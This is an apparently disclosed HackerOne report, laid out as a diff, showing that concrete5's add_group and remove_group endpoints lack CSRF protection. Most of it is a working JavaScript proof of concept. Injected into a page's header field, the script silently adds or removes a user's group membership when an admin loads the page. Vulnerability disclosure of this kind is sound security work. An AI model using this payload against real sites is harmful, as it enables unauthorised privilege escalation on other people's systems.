@@ -1,0 +1,63 @@
+ReportLink:https://hackerone.com/reports/64184
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/jmpalk
+ReportedTo:concrete5(concrete5)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:26.08.2015 20:03:22
+
+Summary:
+`add_group` and `remove_group` have no CSRF protection.
+crayons
+
+There is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group. 
+
+
+
+A malicious POST request can be constructed to add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site.
+
+For example, a registered user who has access to edit a given page (say, a blog post) could add the following javascript to the "Extra Header Content" section of the page's SEO module:
+
+<!-- 
+<script language="JavaScript" type="text/javascript">
+ 
+     window.onload = promoteUser();
+ 
+     function promoteUser() {
+       var XHR = new XMLHttpRequest();
+       var urlEncodedData = "";
+       var urlEncodedDataPairs = [];
+       var name;
+       var data = {gID:'3', uID:'8'}; //sub uID for whatever uID you want to promote
+ 
+       for(name in data) {
+         urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
+       } //end for(name in data)
+ 
+       urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+');
+ 
+       XHR.addEventListener('load', function(event){
+         //alert boxes for testing purposes only
+         //alert('Yeah! Data sent and response loaded.');
+         });
+ 
+       XHR.addEventListener('error', function(event){
+         //alert boxes for testing purposes only
+         //alert('Oops. Something went wrong.');
+         });
+ 
+       XHR.open('POST', 'http://<<site>>/concrete5/index.php/ccm/system/user/add_group');
+// alt:  XHR.open('POST', // 'http://<<site>>/concrete5/index.php/ccm/system/user/remove_group');
+
+       XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+       XHR.setRequestHeader('Content-Length', urlEncodedData.length);
+ 
+       XHR.send(urlEncodedData);
+ 
+     }//end promoteUser
+</script>
+
+-->
+
+As an aside, I'm not sure whether allowing any user to add javascript to the "Extra Header Content" field of a page's SEO module counts as XSS or not, since it seems like a feature, albeit one that could be abused.
